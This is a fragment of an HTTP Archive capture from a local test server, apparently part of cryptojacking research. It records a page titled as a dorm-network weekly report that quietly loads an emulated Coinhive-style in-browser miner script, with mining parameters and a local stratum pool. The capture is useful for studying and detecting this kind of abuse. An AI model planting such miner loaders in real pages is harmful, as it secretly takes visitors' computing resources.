":[{"name":"Content-Length","value":"577"},{"name":"Content-Type","value":"text/html; charset=utf-8"},{"name":"Date","value":"Mon, 26 Oct 2026 09:02:58 GMT"},{"name":"Server","value":"Python/3.12 aiohttp/3.11.11"}],"content":{"size":577,"mimeType":"text/html; charset=utf-8","compression":0,"text":"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Weekly report: traffic shaping on the dorm network</title>\n<link rel=\"stylesheet\" href=\"/css/site.css\">\n</head>\n<body>\n<header><a href=\"/\">Student Computing Group</a> &middot; <span>network</span></header>\n<main id=\"content\"></main>\n<footer>&copy; student computing group</footer>\n<script src=\"/js/page_common.js\"></script>\n<!-- mining condition: emulated Coinhive-style in-browser miner -->\n<script src=\"/js/miner_loader.js\" data-mode=\"mine\" data-threads=\"2\" data-difficulty=\"22\"></script>\n</body>\n</html>\n"},"headersSize":154,"bodySize":577,"redirectURL":"","_transferSize":731},"cache":{},"timings":{"dns":-1,"connect":-1,"ssl":-1,"send":0,"wait":0.772,"receive":0.902},"_frameref":"frame@ecba6404d8aad57a0cb596b183044200","_monotonicTime":319536.251,"_resourceType":"document","serverIPAddress":"127.0.0.1","_serverPort":8080,"_securityDetails":{}},{"pageref":"page@3c1dccf8c26321e803f7fc7fda3d1fa1","startedDateTime":"2026-10-26T09:02:58.956Z","time":4.163,"request":{"method":"GET","url":"http://127.0.0.1:8080/css/site.css","httpVersion":"HTTP/1.1","cookies":[],"headers":[{"name":"Accept","value":"text/css,*/*;q=0.1"},{"name":"Accept-Encoding","value":"gzip, deflate, br, zstd"},{"name":"Accept-Language","value":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"},{"name":"Connection","value":"keep-alive"},{"name":"Host","value":"127.0.0.1:8080"},{"name":"Referer","value":"http://127.0.0.1:8080/mining?mode=mine&threads=1&pool=ws://127.0.0.1:8777/stratum&user=mining1w2&bust=1793005378.8273993"},{"name":"Sec-Fetch-Dest","value":"style"},{"name":"Sec-Fetch-Mode","value":"no-cors"},